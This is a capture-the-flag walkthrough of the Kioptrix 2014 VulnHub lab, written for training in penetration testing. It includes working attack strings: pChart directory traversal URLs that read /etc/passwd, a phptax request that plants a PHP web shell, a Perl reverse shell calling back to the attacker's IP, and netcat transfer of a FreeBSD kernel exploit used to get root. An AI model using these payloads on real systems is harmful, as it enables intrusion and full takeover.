## VM Installation

### VM Download

[Kioptrix: 2014 (#5) \~ VulnHub](https://www.vulnhub.com/entry/kioptrix-2014-5,62/)

Download the VM using the Mirror Link. The fix does not have to be downloaded. The VM can be set up in VirtualBox without it.  

![[kioptrix-1.png|640]]

The downloaded file will have the extension `.tar.bz2`. Use extraction software like `7-Zip` to decompress the file. When the `.tar.bz2` file is extracted it will produce a `.tar` archive. Once the `.tar` archive is extracted it will create a directory that contains the VM.

![[kioptrix-3.png|500]]

### VM Creation

![[kioptrix-4.png|540]]

Note the location where the VM is saved. Set the VM type to `BSD` and Version to `FreeBSD (64-bit)`.

![[kioptrix-5.png|540]]

![[kioptrix-6.png|540]]

Select "Do Not Add a Virtual Hard Disk".

![[kioptrix-7.png|540]]

Click on "Continue" to complete the setup.

![[kioptrix-9.png|540]]

### VM Configuration

From the `Kioptrix2014` directory copy the `.vmdk` file and paste it in the directory where VirtualBox created the VM.

![[kioptrix-10.png|500]]

Go to "Settings".

![[kioptrix-13.png|540]]

On the System page for Boot Order, the Hard Disk should be followed by the Optical drive. Disable the Floppy drive. 

![[kioptrix-14.png|500]]

On the Storage page click on the Hard drive icon.

![[kioptrix-15.png|500]]

Select "Add" and then select the `.vmdk` file.

Click on "Choose" to mount the virtual hard disk to the VM.

![[kioptrix-16.png|540]]

![[kioptrix-17.png|500]]

Change the Network settings as per your lab's configuration.

Start the VM. The VM will boot to a screen with the `mountroot` prompt.

![[kioptrix-19.png|500]]

Enter: `ufs:/dev/ada0p2`  
This command will need to be provided every time the VM is booted.

![[kioptrix-20.png|500]]

![[kioptrix-21.png|500]]

## Reconnaissance

### Host Discovery

The Kioptrix VM is set up on a `10.6.6.1/24` network. My Kali machine is on the `10.0.0.1/24` network.

[Building a Virtual Security Home Lab: Part 1 - Network Topology](https://blog.davidvarghese.dev/posts/building-home-lab-part-1/)

![[lab-network-setup.png|440]]

To find all the devices on the `10.6.6.1/24` network I performed the Nmap Ping Scan. Ping scan utilizes ICMP echo packets to detect devices. If the firewall is configured to block ICMP packets this scan will not work.

```bash
nmap -sn 10.6.6.1/24
```

`-sn`: Ping Scan (Ping Sweep)

![[recon-1.png|440]]

### Port Scanning

The next step is to collect information about the services running on the VM. Port scanners like Nmap, Rustscan and Angry IP Scanner can help us to identify running services.

[GitHub - RustScan/RustScan: ðŸ¤– The Modern Port Scanner ðŸ¤–](https://github.com/RustScan/RustScan)

```bash
sudo rustscan -a 10.6.6.15 --ulimit 5000 -- -sS -Pn -A -T4 -oN rustscan.txt
```

`-a`: IP Address  
`--ulimit`: Amount of sockets (connections) that are opened  
`-sS`: Stealth Scan (Use partial TCP 3-way handshake)  
`-Pn`: Disable Ping Scan (Assume services are online)  
`-A`: Aggressive Scan (Service Versioning, OS Detection & Default Script Scan)  
`-T4`: Timing Template (Aggressive) - Faster Scan  
`-oN`: Normal Output

I added the `-Pn` flag as the service version scan was reporting the ports as closed even though the ports were open.

![[recon-2.png|500]]

Ports 80 and 8080 are open on the target.

![[recon-3.png|560]]

Port 80: HTTP (Web server)  
Port 8080: Non-standard Port (Web server)

The scan also found that the target is running FreeBSD.

## Enumeration

### Port 80

The website running on port 80 returns a page with the text "It works!". There was nothing else on the page so I decided to take a look at the page source code. On Firefox this can be done using the shortcut `Ctrl + U`.

![[articles/images/vulnhub-kioptrix-lvl5/website-1.png|400]]

The comment in the source code contained a path: `pChart2.1.3/index.php`

![[articles/images/vulnhub-kioptrix-lvl5/website-2.png|500]]

This path opened the `pChart` home page.

![[articles/images/vulnhub-kioptrix-lvl5/website-7.png|460]]

Next, I ran `nikto` and `gobuster` to enumerate details about the website.

```bash
nikto -h http://10.6.6.15/pChart2.1.3/ -o nikto.txt
```

The scan discovered a directory (`/data`) and a `readme.txt` file. The site is also found to be using the outdated version of the `mod_ssl`.

![[articles/images/vulnhub-kioptrix-lvl5/website-3.png|640]]

```bash
gobuster dir --url http://10.6.6.15/pChart2.1.3/ -w /usr/share/wordlists/dirb/common.txt | tee gobuster.txt
```

The scan found some additional directories but none of them look promising. The `| tee gobuster.txt` command is used to save the output of the command that is used before the `|` symbol to a file while simultaneously outputting it to the terminal.

![[articles/images/vulnhub-kioptrix-lvl5/website-4.png|540]]

The `/data` path loads a directory listing of the files in the folder.

![[articles/images/vulnhub-kioptrix-lvl5/website-5.png|380]]

The `readme.txt` file contains details on configuring `pChart`. 

![[articles/images/vulnhub-kioptrix-lvl5/website-6.png|400]]

### Port 8080

I could not access the website running on port 8080. I did not have the correct permission.

![[website2-1.png|400]]

## Exploitation

### Port 80

I searched online for exploits that target `pChart 2.1.3` and found the following:

[pChart 2.1.3 - Multiple Vulnerabilities - PHP webapps Exploit](https://www.exploit-db.com/exploits/31173)

`pChart` is vulnerable to "Directory Traversal". Directory traversal vulnerabilities allow an attacker to access restricted directories, execute commands and view data that are outside the website's root folder.

Using the below URL I was able to list the content of the `passwd` file.

```
http://10.6.6.15/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd
```

`%2f`: URL Encoded (`/`)

![[articles/images/vulnhub-kioptrix-lvl5/website-8.png|600]]

Using directory traversal vulnerability, I tried to view the content of the Apache configuration file. The config file should contain details on what permissions are required for accessing the website running on port 8080.

FreeBSD stores the Apache config (`httpd.conf`) at `/usr/local/etc/apache22/`.

![[articles/images/vulnhub-kioptrix-lvl5/website-11.png|460]]

[FreeBSD Install and Configure Apache Web Server - nixCraft](https://www.cyberciti.biz/faq/freebsd-apache-web-server-tutorial/)

```
http://10.6.6.15/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf
```

![[articles/images/vulnhub-kioptrix-lvl5/website-9.png|600]]

Toward the end of the file, the configuration for the website running on port 8080 can be found. The website is configured to only accept requests from a specific "User-Agent".

![[articles/images/vulnhub-kioptrix-lvl5/website-10.png|400]]

### Port 8080

The simplest method to change the User-Agent string is to use a plugin. I recommend using "User-Agent Switcher" by Erin Schlarb.

[User-Agent Switcher â€“ Get this Extension for ðŸ¦Š Firefox (en-US)](https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/)

![[website2-2.png|600]]

After the plugin was installed I went into the settings for the plugin and created a new User Agent.

![[website2-3.png|300]]

![[website2-4.png|500]]

![[website2-5.png|260]]

Once I refreshed the page I was able to access the website on port 8080.

![[website2-6.png|400]]

The website is running a tax filing application called `phptax`. This application is written in PHP.

![[website2-7.png|540]]

I searched online for `phptax` exploits. 2 RCE exploits were available for the application. The exploit that I used first did not work.

[PhpTax 0.8 - File Manipulation 'newvalue' / Remote Code Execution](https://www.exploit-db.com/exploits/25849)

The above script creates a file on the target that can then be used to execute arbitrary commands. I performed the steps shown in the script manually. The important lines from the code have been highlighted in the image below.

![[articles/images/vulnhub-kioptrix-lvl5/exploit-1.png|500]]

I appended the string that is shown on the 2nd line to the end of the URL for the `phptax` site. The string contains URL-encoded data. `CyberChef` can be used to view the decoded string.

[CyberChef - The Cyber Swiss Army Knife](https://0x1.gitlab.io/code/CyberChef/)

![[articles/images/vulnhub-kioptrix-lvl5/exploit-4.png|640]]

The URL creates a file called `rce.php` on the target. The file will contain the text `<?php passthru($_GET[cmd]);?>`. The `passthru()` function makes it possible to execute system commands using PHP.

[PHP: passthru - Manual](https://www.php.net/manual/en/function.passthru.php)

```
http://10.6.6.15:8080/phptax/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E
```

When the URL is used there will be no change on the webpage.

![[articles/images/vulnhub-kioptrix-lvl5/exploit-2.png|640]]

To test if the `rce.php` file is created, in a new tab I ran the following:

```
http://10.6.6.15:8080/phptax/data/rce.php?cmd=id
```

![[articles/images/vulnhub-kioptrix-lvl5/exploit-3.png|460]]

If you get the result of the `id` command the file was created successfully.

### Remote Shell

Now that I could execute commands on the target the new step was to set up a reverse shell to explore and navigate the system.

Using `netcat` I setup a listener on port 9000

```bash
netcat -nvlp 9000
```

`-n`: No DNS lookup  
`-v`: Verbose  
`-l`: Listen for inbound connect  
`-p`: Port Number

![[reverse-shell-1.png|240]]

For creating reverse shells I recommend using "Reverse Shell Generator".

[Reverse Shell Generator - Online](https://www.revshells.com/)

I tried many of the reverse shells that were listed on the site but none of them worked. In the end, I got the "`Perl no sh`" shell to work. 

In a reverse shell, the target initiates the connection with the client so, in the code the IP address of the attack machine has to be used. 

![[reverse-shell-2.png|600]]

For the reverse shell to work, I had to URL encode it. This step can be done easily using `CyberChef`. 

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.2:9000");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

![[reverse-shell-3.png|640]]

```
http://10.6.6.15:8080/phptax/data/rce.php?cmd=perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.2:9000");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

The encoded string is used as the value for the parameter `cmd`. This parameter is executed by the `passthru()` function.

![[reverse-shell-4.png|640]]

If the reverse shell is configured properly a connection with the target machine will be established.

### Privilege Escalation

Once I had access to the system I started searching for misconfigured services.

I checked for processes that are running as `root` and found none.

```bash
ps aux | grep root
```

![[escalation-1.png|460]]

Using the `find` command I looked for executables that have SUID or GUID bit set. I did not find any such executable.

```bash
# Files with SUID set  
find . /perm 4000

# Files with GUID set
find . /perm 2000

# Files with both SUID and GUID set
find . /perm 6000
```

Since I could not find any exploitable services I decided to check if any kernel exploits could be found.

```bash
uname -a
```

![[escalation-2.png|500]]

The target was running kernel 9.0. I searched online for exploits that target this version and found two.

![[escalation-3.png|500]]

The 1st exploit (SYSRET) did not work when I tried it. So I ended up using the `mmap/ptrace` exploit.

[FreeBSD 9.0 \< 9.1 - 'mmap/ptrace' Local Privilege Escalation - FreeBSD Exploit](https://www.exploit-db.com/exploits/26368)

The exploit is written in C which means `gcc` has to be present on the target so that the code can be compiled. I also have to copy the code from my system to the target for this `wget` or `curl` would be required.

```bash
which gcc
which wget
which curl
```

The target had `gcc` but it did not have `wget` and `curl`. I tried to install `curl` but I was unable to do so.

[Installing Applications \| FreeBSD Documentation Portal](https://docs.freebsd.org/en/books/handbook/ports/)

The target had `netcat` installed. `netcat` can also be used to transfer files. 

<iframe 
	width="560" height="315" 
	src="https://www.youtube-nocookie.com/embed/Vh0wXXWZ4kQ?si=jO8Jb_tSOzW4gzEo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen>
</iframe>

I downloaded the kernel exploit code and renamed it to `ptrace.c`.

In a new terminal using `netcat` I set up the sender.

```bash
nc -v -w 30 -p 9001 -l < ptrace.c
```

`-v`: Verbose  
`-w`: Timeout duration  
`-p`: Port Number  
`-l`: Listen for inbound Connections  
`< ptrace.c`: Pipe the content of the file into `nc`

![[escalation-4.png|380]]

On the target, I set up the receiver. The receiver reaches out to the sender for the file so on the target machine the IP address of the attack machine is used. 

```bash
nc -v -w 2 10.0.0.2 9001 > ptrace.c
```

`> ptrace.c`: Write the output of the command into the file

![[escalation-5.png|360]]

As soon as the transmission is completed the `netcat` sender command will terminate and give back the terminal prompt. Check the size of the file on the receiver. If the file size is not 0 the command was executed correctly.

Now the exploit code can be compiled and executed.

```bash
gcc ptrace.c -o ptrace
./ptrace
```

![[escalation-6.png|560]]

Using the `id` and `whoami` command I verified that I was now the `root` user. I checked the `/root` directory for a flag and found the `congrats.txt` file.

![[root-flag.png|500]]
